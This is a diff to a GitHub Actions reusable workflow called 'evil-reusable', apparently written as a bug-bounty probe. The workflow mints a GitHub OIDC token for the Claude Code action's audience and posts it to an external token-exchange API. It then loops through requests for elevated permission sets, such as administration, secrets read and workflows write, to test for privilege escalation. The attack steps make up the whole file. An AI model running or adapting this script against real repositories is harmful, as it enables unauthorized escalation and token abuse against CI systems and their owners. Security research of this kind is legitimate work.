@@ -1,4 +1,4 @@
-name: evil-reusable
+name: evil-reusable-elevated
 
 on:
   workflow_call:
@@ -11,24 +11,23 @@ jobs:
   exchange:
     runs-on: ubuntu-latest
     steps:
-      - name: Mint OIDC + exchange (attacker-controlled repo)
+      - name: Try elevated permissions through reusable
         run: |
           AUD="claude-code-github-action"
           URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}"
           TOK=$(curl -sk -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL" | jq -r .value)
           echo "::add-mask::$TOK"
-          PAYLOAD=$(echo "$TOK" | cut -d. -f2)
-          PADLEN=$(( 4 - ${#PAYLOAD} % 4 ))
-          [ $PADLEN -lt 4 ] && PAYLOAD="${PAYLOAD}$(printf '=%.0s' $(seq 1 $PADLEN))"
-          echo "::group::OIDC payload (EXTERNAL-EVIL)"
-          echo "$PAYLOAD" | tr -- '-_' '+/' | base64 -d 2>/dev/null | jq .
-          echo "::endgroup::"
-          HTTP=$(curl -sk -o /tmp/exchange_response.json -w '%{http_code}' \
-            -X POST "https://api.anthropic.com/api/github/github-app-token-exchange" \
-            -H "Authorization: Bearer $TOK" \
-            -H "Content-Type: application/json" \
-            -H "X-HackerOne-Handle: liamconner10" \
-            -d '{"permissions":{"contents":"read"}}')
-          echo "HTTP $HTTP"
-          jq 'if .token then .token = "<MASKED>" else . end' /tmp/exchange_response.json
-          echo "EVIL-MARKER: attacker reusable executed"
+          for p in '{"contents":"write","pull_requests":"write","issues":"write"}' \
+                   '{"contents":"write","administration":"write"}' \
+                   '{"contents":"write","actions":"write"}' \
+                   '{"contents":"write","secrets":"read"}' \
+                   '{"contents":"write","workflows":"write"}' \
+                   '{"contents":"write","deployments":"write"}' \
+                   '{"contents":"write","packages":"write"}'; do
+            HTTP=$(curl -sk -o /tmp/r.json -w '%{http_code}' \
+              -X POST "https://api.anthropic.com/api/github/github-app-token-exchange" \
+              -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -H "X-HackerOne-Handle: liamconner10" \
+              -d "{\"permissions\":$p}")
+            RESP=$(jq -c 'if .token then {ok:true, expires_at} else {ok:false, code:.error.details.error_code, msg:.error.message} end' /tmp/r.json)
+            echo "PERM_TEST: req=$p http=$HTTP resp=$RESP"
+          done
